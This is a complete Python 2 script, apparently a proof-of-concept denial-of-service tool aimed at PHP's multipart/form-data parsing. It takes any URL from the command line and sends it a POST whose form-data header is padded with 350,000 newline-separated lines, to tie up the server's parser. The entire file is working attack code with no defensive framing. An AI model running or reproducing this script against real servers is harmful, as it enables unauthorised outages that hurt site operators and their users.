import socket
import sys
from urlparse import urlparse

# Globals
PORT = 80
FLOOD_SIZE = 350000

def flood(url):

    # Get host and path
    parsed_url = urlparse(url)
    host = parsed_url.netloc
    path = parsed_url.path

    # Check
    if host == "":
        print 'Invalid Http address. Try like http://foo.bar/'
        return
    if path == "":
        path = '/'

    print 'target   ' + url
    print 'host     ' + host
    print 'path     ' + path

    data = construct_packet(host, path)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 80))
    sent = s.send(data)
    print str(sent) + ' sent.'
    s.close()
    return


def construct_packet(host, path):

    # Boundary
    boundary = '----PHP69364TEST'

    # Http request header
    http_header = 'POST ' + path + ' HTTP/1.1\r\n'

    # Http request payload
    http_data = '--' + boundary + '\n'
    http_data += 'Content-Disposition: form-data; name="test"; filename=test'

    # Http request payload - flood
    flood = 'x\n'
    tail = 'Content-Type: application/octet-stream\r\n\r\nfinish\r\n' + \
           '--' + boundary + '--'
    flood *= FLOOD_SIZE
    http_data += flood
    http_data += tail

    # Http request header
    http_header += 'Content-Length: ' + str(len(http_data.encode('utf-8'))) + '\r\n'
    http_header += 'Accept-Encoding: gzip, deflate\r\n'
    http_header += 'Connection: close\r\n'
    http_header += 'Host: ' + host + '\r\n'
    http_header += 'Content-Type: multipart/form-data; boundary=' + boundary + '\r\n'
    http_header += '\r\n'
    http_request = http_header + http_data
    return http_request


if __name__ == "__main__":
    flood(sys.argv[1])
